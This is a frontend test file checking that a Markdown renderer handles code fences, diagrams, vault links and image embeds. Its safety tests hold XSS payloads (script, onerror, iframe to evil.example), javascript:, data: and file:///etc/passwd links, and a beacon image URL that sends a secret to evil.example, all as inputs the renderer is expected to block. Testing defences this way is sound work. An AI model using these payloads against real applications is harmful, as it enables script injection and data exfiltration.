import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { fireEvent, render, screen, waitFor } from "@testing-library/react";

vi.mock("mermaid", () => ({
  default: {
    initialize: vi.fn(),
    render: vi.fn(async () => ({ svg: '<svg data-testid="mermaid-svg"></svg>' })),
  },
}));

import { MarkdownRenderer, fenceLanguage, markdownUrlTransform } from "./MarkdownRenderer";
import { useAetherStore } from "../lib/store";
import { clearVaultAssetCache } from "../lib/vaultAssets";
import { mockHandlers, resetMockState, setMockLatency } from "../lib/mock/backend";
import { mockVault } from "../lib/mock/vaultStore";
import { MOCK_VAULT_ROOT } from "../lib/mock/fixtures/vault";

const originals = { ...mockHandlers };

beforeEach(() => {
  vi.stubEnv("VITE_AETHER_MOCK", "1");
  setMockLatency(0);
  resetMockState();
  clearVaultAssetCache();
  useAetherStore.setState({ vaultPath: MOCK_VAULT_ROOT, vaultNotes: mockVault.list(), view: "dashboard", selectedNotePath: null });
});

afterEach(() => {
  Object.assign(mockHandlers, originals);
  vi.unstubAllEnvs();
  vi.restoreAllMocks();
});

describe("MarkdownRenderer", () => {
  it("renders inline code inline and fenced code as one pre > code", () => {
    const errors = vi.spyOn(console, "error").mockImplementation(() => undefined);
    const { container } = render(
      <MarkdownRenderer content={"Run `npm test` now.\n\n```ts\nconst a = 1;\n```\n\n    indented block\n"} />
    );
    const inline = screen.getByText("npm test");
    expect(inline.tagName).toBe("CODE");
    expect(inline.parentElement?.tagName).toBe("P");
    expect(container.querySelectorAll("p pre")).toHaveLength(0);

    const blocks = container.querySelectorAll("pre");
    expect(blocks).toHaveLength(2);
    expect(container.querySelectorAll("pre pre")).toHaveLength(0);
    expect(blocks[0]).toHaveClass("md-code-block");
    expect(blocks[0].querySelector("code.language-ts")?.textContent).toBe("const a = 1;\n");
    expect(blocks[1].querySelector("code")?.textContent).toBe("indented block\n");
    // No validateDOMNesting / unknown-prop warnings.
    expect(errors).not.toHaveBeenCalled();
  });

  it("renders mermaid fences as diagrams, not code", async () => {
    const { container } = render(<MarkdownRenderer content={"```mermaid\ngraph TD; A-->B\n```"} />);
    await waitFor(() => expect(screen.getByTestId("mermaid-svg")).toBeInTheDocument());
    expect(container.querySelector("pre")).toBeNull();
  });

  it("renders task checkboxes read-only", () => {
    const errors = vi.spyOn(console, "error").mockImplementation(() => undefined);
    render(<MarkdownRenderer content={"- [x] done\n- [ ] open\n"} />);
    const boxes = screen.getAllByRole("checkbox");
    expect(boxes.map((b) => (b as HTMLInputElement).checked)).toEqual([true, false]);
    expect(boxes.every((b) => (b as HTMLInputElement).disabled)).toBe(true);
    expect(errors).not.toHaveBeenCalled();
  });

  it("reads the fence language from the code element's classes", () => {
    expect(fenceLanguage({ type: "element", properties: { className: ["language-rust"] } })).toBe("rust");
    expect(fenceLanguage({ type: "element", properties: { className: "hljs language-js" } })).toBe("js");
    expect(fenceLanguage({ type: "element", properties: {} })).toBeNull();
    expect(fenceLanguage(undefined)).toBeNull();
  });
});

describe("MarkdownRenderer safety", () => {
  const INJECTION = `<img src=x onerror="window.__pwned=1"><script>window.__pwned=1</script><iframe src="https://evil.example"></iframe>`;

  it("shows raw HTML as text instead of rendering it", () => {
    const { container } = render(<MarkdownRenderer content={`Hello\n\n${INJECTION}\n\n<b>bold?</b>`} />);
    expect(container.querySelector("script, iframe, b, img[src='x']")).toBeNull();
    expect(container.textContent).toContain("<script>");
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });

  it("drops javascript: and data: links and never navigates the webview", async () => {
    const open = vi.fn(originals.cmd_agent_open_url);
    mockHandlers.cmd_agent_open_url = open;
    const { container } = render(
      <MarkdownRenderer
        content={[
          "[js](javascript:alert(1))",
          "[tab](java\tscript:alert(1))",
          "[data](data:text/html;base64,PHNjcmlwdD4=)",
          "[file](file:///etc/passwd)",
          "[web](https://tauri.app/docs)",
          "[mail](mailto:ekin@example.com)",
        ].join("\n\n")}
      />
    );
    const anchors = [...container.querySelectorAll("a")];
    expect(anchors.map((a) => a.textContent)).toEqual(["web", "mail"]);
    expect(screen.getByText("js").closest("a")).toBeNull();
    expect(screen.getByText("data").closest("a")).toBeNull();

    const click = new MouseEvent("click", { bubbles: true, cancelable: true });
    screen.getByText("web").closest("a")!.dispatchEvent(click);
    expect(click.defaultPrevented).toBe(true);
    await waitFor(() => expect(open).toHaveBeenCalledWith({ url: "https://tauri.app/docs" }));
  });

  it("opens links to vault notes in the editor, unknown ones stay text", () => {
    const note = `${MOCK_VAULT_ROOT}/01-Projects/AETHER-OS Roadmap.md`;
    render(
      <MarkdownRenderer
        notePath={`${MOCK_VAULT_ROOT}/01-Projects/AETHER-OS.md`}
        content={"[Roadmap](AETHER-OS%20Roadmap.md) and [ghost](Nope.md)"}
      />
    );
    expect(screen.getByText("ghost").closest("a")).toBeNull();
    fireEvent.click(screen.getByText("Roadmap"));
    expect(useAetherStore.getState().selectedNotePath).toBe(note);
    expect(useAetherStore.getState().view).toBe("editor");
  });

  it("turns [[wikilinks]] into note links and dims unknown ones", () => {
    render(<MarkdownRenderer content={"See [[AETHER-OS Roadmap|the roadmap]], [[Ghost note]] and `[[Code]]`."} />);
    expect(screen.getByText("Ghost note").closest("a")).toBeNull();
    expect(screen.getByText("Ghost note")).toHaveClass("is-missing");
    expect(screen.getByText("[[Code]]").tagName).toBe("CODE");
    fireEvent.click(screen.getByText("the roadmap"));
    expect(useAetherStore.getState().selectedNotePath).toBe(`${MOCK_VAULT_ROOT}/01-Projects/AETHER-OS Roadmap.md`);
  });

  it("keeps inline data images and blanks other data URLs", () => {
    expect(markdownUrlTransform("data:image/png;base64,AAAA", "src")).toBe("data:image/png;base64,AAAA");
    expect(markdownUrlTransform("data:text/html;base64,AAAA", "src")).toBe("");
    expect(markdownUrlTransform("data:image/png;base64,AAAA", "href")).toBe("");
    expect(markdownUrlTransform("javascript:alert(1)", "href")).toBe("");
  });
});

describe("MarkdownRenderer vault media", () => {
  it("loads a relative image through cmd_read_vault_asset, falling back to the vault root", async () => {
    const read = vi.fn(originals.cmd_read_vault_asset);
    mockHandlers.cmd_read_vault_asset = read;
    render(
      <MarkdownRenderer
        notePath={`${MOCK_VAULT_ROOT}/03-Resources/Sauerteigbrot Rezept.md`}
        content={"![Frisch gebackenes Brot](attachments/sourdough.jpg)"}
      />
    );
    expect(screen.getByRole("status", { name: /Loading image sourdough\.jpg/ })).toBeInTheDocument();
    const img = await screen.findByRole("img", { name: "Frisch gebackenes Brot" });
    expect(img.getAttribute("src")).toMatch(/^data:image\/png;base64,iVBORw0KGgo/);
    expect(read.mock.calls.map(([args]) => args.path)).toEqual([
      "03-Resources/attachments/sourdough.jpg",
      "attachments/sourdough.jpg",
    ]);
  });

  it("renders Obsidian embeds with their size and caches by path", async () => {
    const read = vi.fn(originals.cmd_read_vault_asset);
    mockHandlers.cmd_read_vault_asset = read;
    const notePath = `${MOCK_VAULT_ROOT}/01-Projects/AETHER-OS.md`;
    const { unmount } = render(<MarkdownRenderer notePath={notePath} content={"Before ![[aether-architecture.png|480]] after"} />);
    const img = await screen.findByRole("img", { name: "aether-architecture.png" });
    expect(img.getAttribute("width")).toBe("480");
    const calls = read.mock.calls.length;
    unmount();
    render(<MarkdownRenderer notePath={notePath} content={"![[aether-architecture.png]]"} />);
    // Served from the cache: rendered at once, no new IPC call.
    expect(screen.getByRole("img", { name: "aether-architecture.png" })).toBeInTheDocument();
    expect(read.mock.calls.length).toBe(calls);
  });

  it("finds attachments by file name and shows a fallback for missing files", async () => {
    render(
      <MarkdownRenderer
        notePath={`${MOCK_VAULT_ROOT}/01-Projects/Garden Planner App.md`}
        content={"![Sketch](garden-sketch.png)\n\n![[missing-photo.jpg]]"}
      />
    );
    expect(await screen.findByRole("img", { name: "Sketch" })).toHaveAttribute("src", expect.stringMatching(/^data:image\/png/));
    const missing = await screen.findByRole("img", { name: "image unavailable: missing-photo.jpg" });
    expect(missing).toHaveTextContent("Image unavailable");
    expect(missing.getAttribute("title")).toMatch(/^Asset not found/);
  });

  it("leaves embeds in code and note transclusions alone", () => {
    const { container } = render(<MarkdownRenderer content={"`![[x.png]]` and ![[Other note]]\n\n```\n![[y.png]]\n```"} />);
    expect(container.querySelector("code")?.textContent).toBe("![[x.png]]");
    expect(container.textContent).toContain("![[Other note]]");
    expect(container.querySelector("pre")?.textContent).toContain("![[y.png]]");
    expect(container.querySelector(".md-media-state, img")).toBeNull();
  });

  it("does not beacon out to web images unless allowed", () => {
    const { rerender, container } = render(<MarkdownRenderer content={"![pixel](https://evil.example/p.png?d=secret)"} />);
    expect(container.querySelector("img")).toBeNull();
    const blocked = screen.getByRole("img", { name: "image not loaded: evil.example" });
    fireEvent.click(screen.getByRole("button", { name: "Load" }));
    expect(container.querySelector("img")?.getAttribute("src")).toBe("https://evil.example/p.png?d=secret");
    expect(blocked).not.toBeInTheDocument();
    rerender(<MarkdownRenderer content={"![logo](https://tauri.app/logo.png)"} remoteMedia />);
    expect(container.querySelector("img")?.getAttribute("src")).toBe("https://tauri.app/logo.png");
  });

  it("renders only alt text when media is disabled", () => {
    const read = vi.fn(originals.cmd_read_vault_asset);
    mockHandlers.cmd_read_vault_asset = read;
    const { container } = render(<MarkdownRenderer allowMedia={false} content={"![Chart](chart.png) ![[x.png]]"} />);
    expect(container.querySelector("img, .md-media-state")).toBeNull();
    expect(container.textContent).toContain("Chart");
    expect(read).not.toHaveBeenCalled();
  });
});
